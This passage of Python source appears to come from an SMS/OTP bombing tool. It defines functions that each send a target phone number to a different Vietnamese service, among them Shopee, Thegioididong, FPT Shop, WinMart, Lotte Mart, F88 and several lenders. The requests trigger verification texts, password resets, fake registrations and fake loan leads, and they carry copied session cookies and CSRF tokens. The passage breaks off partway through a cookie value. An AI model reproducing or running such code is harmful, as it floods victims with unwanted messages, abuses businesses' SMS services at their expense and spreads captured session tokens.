        # 'cookie': '__Host-next-auth.csrf-token=14b2514d94fe41605786ef086cffbab297d54c010cdb62c54bc8dad4c84f17ce%7Cf56d91c5542867ff5e83a10d7b0c0b481903f9dfa0917700d5b96641511dd8d8; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'dnt': '1',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp',
        headers=headers,
        json=json_data,
    )
    
def send_otp_via_DONGCRE(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'priority': 'u=1, i',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data)
    
def send_otp_via_shopee(sdt):
    cookies = {
        '_QPWSDCXHZQA': 'e7d49dd0-6ed7-4de5-a3d4-a5dddf426740',
        'REC7iLP4Q': '312bf815-7526-4121-82bf-61c29691b57f',
        'SPC_F': 'eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq',
        'REC_T_ID': '23f51dde-355f-11ef-bcef-3eebbabc6162',
        'SPC_R_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
        'SPC_R_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
        'SPC_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
        'SPC_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
        '__LOCALE__null': 'VN',
        'csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
        'SPC_SI': 'p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=',
        'SPC_SEC_SI': 'v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=',
        '_sapid': '1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'af-ac-enc-dat': '438deef2a644b9a6',
        'af-ac-enc-sz-token': '',
        'content-type': 'application/json',
        # 'cookie': '_QPWSDCXHZQA=e7d49dd0-6ed7-4de5-a3d4-a5dddf426740; REC7iLP4Q=312bf815-7526-4121-82bf-61c29691b57f; SPC_F=eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq; REC_T_ID=23f51dde-355f-11ef-bcef-3eebbabc6162; SPC_R_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_R_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; SPC_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; __LOCALE__null=VN; csrftoken=PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs; SPC_SI=p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=; SPC_SEC_SI=v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=; _sapid=1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
        'dnt': '1',
        'origin': 'https://shopee.vn',
        'priority': 'u=1, i',
        'referer': 'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-source': 'pc',
        'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
        'x-requested-with': 'XMLHttpRequest',
        'x-sap-ri': '22d9a8667b497dfe94c089340401498ec675997cbc5522816f11',
        'x-sap-sec': 'u476ZVItP6d5d4mjdbAXdgcjKHFhdxPj2bFOdZcj/6FRdZtjMbFndaJjNbFXdbcjQ6FYdbZjdbTKdgmj1HTVdihjXbTXdjLjDbTzdjUjGbAsdlmjYbA/dm3jZbA2dmmjabAVdyJjjbAXdzcjlbAzdzFjhHDpdCGjobD/dG3jEbDQdGZjHVDNdYLjObDDdYZjkbDbdwejIVDzdwUjLbAXdbFjdbA4pbTIj2Vwd6Fj0btjdycgdbAexbTfQbtjdbFjdYuMg3R2dbAfu+JgdbFjdbFicmAmm6FOr4gV0FVMdbTFRTFgdbFjGVM7BbUjdmmjdbFjdbJOjbFjdbFjdgp5d6FjdwnL2dnfehPjdbsORbUjdbFjdffRd6FjdbFjgFDdVQSzd6Fjnb8jdwFgdbFud6FjsbUjdzNzZqlVd6Fjvb8jdlFidbA2d6FjP1U0zzmgdbFuUwR1dbFjUEMSOBFjdZ04ObUjdaSwN7JjdbFlmb8jdfFidbFjdbTccbUjdbFjdbiAdVFjdbFj06mjdbTd7kdDOV8jdzb1b1qqfGpdmLdIqAAKbRL2SgDbBNg6B3nVd7kGR7z4+wJ7/SSwEScz+iqxyMwILgB12leqy9yJfu70zqiQnIK2ygQtEcp6oSZ42fKlHdCQVg5R19dNKIZ6UIIK0AzVwJsXTLbqq3J/i8rgxRmTn+rOOQG40bhL70hPMPRhbJAC+M0yWItYBwrvGjS4PdAPtn5ioTpEKu4zqw6ogq5Dc+AJpdsvRWZB71oRp6qeur1aMxYkXHiYukh88xRrpj+t5K+OndYJeXfMScjRaYcUbZItYcOAvG3gacwmnxPK9FVwLgq+pD0M3UxDWWEF3VrG1lEjFX8fe8CLeRmb9f7OmN78WcxxPrkRQp6oDTgiEgC8cLXyfNziJj26Ehw72GpZfVQTL83eiqN9PyHYVVdgBXRDzUlt2ZrTkam6CP9G0lNtX3EIzhx0zPNMjqianyiQlzOVpAePiwIH/6FjdbmjdbF4RkZoRbFjdGMmX/PwdbFjShlMH/8O2LUjdbFjQbFjdCetJ6y/XoLodbFjdbFjdbFldbFj4qNrSSX+3bFbdbFj6HTr22kcoV8pR8LkdbFjdbUjdbDaEVFjd6FjdwDhdbFzdbFjs0N2S6FjdbFzdbFjMRwF6HmjdbAwW0FyRbFjdfdtkbgwdbFj92xLl1DrRHgwdbFj2EfR0xPP0EJjdbFjQbFjdaZ586CeX0LoRbFjdzqIPjMgdbFjzOGjdbUjdbAjuHFjRbFjdzqIPjMwdbFj2vF4HLfdStgjdbFjQbFjdz9mxU80RDtYRbFjdfJ2+QgfdbFj/t8XdbJjdbFI2hl+KvZ426FjdbD=',
        'x-shopee-language': 'vi',
        'x-sz-sdk-version': '1.10.12',
    }

    json_data = {
        'operation': 8,
        'encrypted_phone': '',
        'phone': sdt,
        'supported_channels': [
            1,
            2,
            3,
            6,
            0,
            5,
        ],
        'support_session': True,
    }

    response = requests.post('https://shopee.vn/api/v4/otp/get_settings_v2', cookies=cookies, headers=headers, json=json_data)


    
def send_otp_via_TGDD(sdt):
    cookies = {
        'TBMCookie_3209819802479625248': '894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
        '___utmvm': '###########',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'beline173|ZqjdK|ZqjdJ',
        'DMX_Personal': '%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "TBMCookie_3209819802479625248=894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=beline173|ZqjdK|ZqjdJ; DMX_Personal=%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY",
        'DNT': '1',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    
def send_otp_via_fptshop(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
    
def send_otp_via_WinMart(sdt):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'Nguyễn Quang Ngọc',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2024-07-26',
        'gender': 'Male',
    }

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
    
def send_otp_via_vietloan(sdt):
    cookies = {
        '__cfruid': '05dded470380675f852d37a751c7becbfec7f394-1722345991',
        'XSRF-TOKEN': 'eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_client': 'false',
        'ec_etag_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_etag_client_utm': 'null',
        'uid': '65518847-15fb-c698-6901-aae49c28ed93',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=05dded470380675f852d37a751c7becbfec7f394-1722345991; XSRF-TOKEN=eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D; ec_cache_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_png_client=false; ec_png_client_utm=null; ec_etag_client=false; ec_etag_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_etag_client_utm=null; uid=65518847-15fb-c698-6901-aae49c28ed93; client=false; client_utm=null',
        'dnt': '1',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
    }

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

    

def send_otp_via_lozi(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://lozi.vn',
        'priority': 'u=1, i',
        'referer': 'https://lozi.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-access-token': 'unknown',
        'x-city-id': '50',
        'x-lozi-client': '1',
    }

    json_data = {
        'countryCode': '84',
        'phoneNumber': sdt,
    }

    response = requests.post('https://mocha.lozi.vn/v1/invites/use-app', headers=headers, json=json_data)

    
def send_otp_via_F88(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://f88.vn',
        'priority': 'u=1, i',
        'referer': 'https://f88.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'FullName': generate_random_name(),
        'Phone': sdt,
        'DistrictCode': '024',
        'ProvinceCode': '02',
        'AssetType': 'Car',
        'IsChoose': '1',
        'ShopCode': '',
        'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
        'FormType': 1,
    }

    response = requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', headers=headers, json=json_data)
    




def send_otp_via_spacet(sdt):
    cookies = {
        '__Secure-3PAPISID': 'hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf',
        '__Secure-3PSID': 'g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076',
        'NID': '516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO_2wB7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmYTJN8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFfEOKXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd79bzaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq5jXEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4YaJT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5jhrJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFfeKgyA_8gwt8-CI_DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9h72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn